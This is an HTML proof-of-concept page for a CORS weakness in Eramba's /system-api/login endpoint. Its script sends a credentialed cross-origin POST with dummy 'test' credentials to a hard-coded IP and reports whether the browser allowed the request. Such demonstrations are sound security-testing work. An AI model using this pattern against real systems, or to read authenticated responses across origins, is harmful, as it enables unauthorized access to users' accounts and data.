<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Eramba Login CORS PoC</title>
  <style>
    body {
      font-family: monospace;
      background: #0f172a;
      color: #e5e7eb;
      padding: 20px;
    }
    h1 { color: #38bdf8; }
    pre {
      background: #020617;
      padding: 15px;
      border-radius: 6px;
      white-space: pre-wrap;
      word-break: break-word;
    }
    .ok { color: #22c55e; }
    .err { color: #ef4444; }
  </style>
</head>
<body>

<h1>Eramba /system-api/login – CORS Proof of Concept</h1>

<p>
This page sends a <strong>cross-origin POST request</strong> to the Eramba login API.
<br>
<strong>No real credentials are used.</strong>
</p>

<h3>Status</h3>
<div id="status">Sending request…</div>

<h3>Response</h3>
<pre id="output">Waiting…</pre>

<script>
(async () => {
  try {
    const response = await fetch(
      "https://16.171.105.4/system-api/login",
      {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "login=test&password=test"
      }
    );

    const text = await response.text();

    document.getElementById("status").innerHTML =
      "<span class='ok'>✔ Cross-origin POST allowed</span>";

    document.getElementById("output").textContent =
      "HTTP Status: " + response.status + "\n\n" + text;

  } catch (e) {
    document.getElementById("status").innerHTML =
      "<span class='err'>✘ Request blocked</span>";
    document.getElementById("output").textContent = e.toString();
  }
})();
</script>

</body>
</html>
